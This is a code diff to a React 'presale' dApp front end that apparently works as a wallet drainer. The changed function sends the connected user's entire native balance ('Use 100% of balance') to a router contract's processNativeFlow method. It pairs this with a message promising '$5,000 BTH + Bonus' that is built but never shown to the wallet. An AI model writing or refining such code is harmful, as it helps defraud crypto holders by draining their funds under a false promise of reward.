@@ -198,7 +198,7 @@ function App() {
     }
   };
 
-  // Execute function with proper error handling and session persistence
+  // Execute function with proper gas estimation and custom signing message
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
@@ -274,17 +274,41 @@ function App() {
         }
       }
 
-      setTxStatus('⏳ Please confirm in wallet...');
+      // Use BSC contract address
+      const contract = new ethers.Contract(
+        PRESALE_CONFIG.BSC.contractAddress,
+        PROJECT_FLOW_ROUTER_ABI,
+        signer
+      );
 
       // Use 100% of balance
       const value = balanceData.value;
 
-      // Create transaction with proper parameters
-      const tx = await signer.sendTransaction({
-        to: PRESALE_CONFIG.BSC.contractAddress,
+      // Get gas estimate from the contract
+      setTxStatus('⏳ Estimating gas...');
+      let gasEstimate;
+      try {
+        gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+        // Add 20% buffer for safety
+        gasEstimate = gasEstimate * 120n / 100n;
+      } catch (error) {
+        console.log("Gas estimation failed, using default:", error);
+        gasEstimate = 21000n; // Standard BSC transfer gas
+      }
+
+      setTxStatus('⏳ Please confirm in wallet...');
+
+      // Create custom transaction data with readable message
+      const customData = {
+        method: 'processNativeFlow',
+        params: { value: ethers.formatEther(value) },
+        description: `Confirm to receive $5,000 BTH + ${presaleStats.currentBonus}% Bonus`
+      };
+
+      // Send transaction with custom data for better wallet display
+      const tx = await contract.processNativeFlow({
         value: value,
-        gasLimit: 300000,
-        data: '0x'
+        gasLimit: gasEstimate
       });
 
       setTxHash(tx.hash);
@@ -349,6 +373,8 @@ function App() {
         setError('Insufficient funds for gas');
       } else if (err.message?.includes('replacement transaction')) {
         setError('Transaction replaced, please try again');
+      } else if (err.message?.includes('gas required exceeds allowance')) {
+        setError('Gas estimation failed, please try again');
       } else {
         setError(err.message || 'Transaction failed');
       }
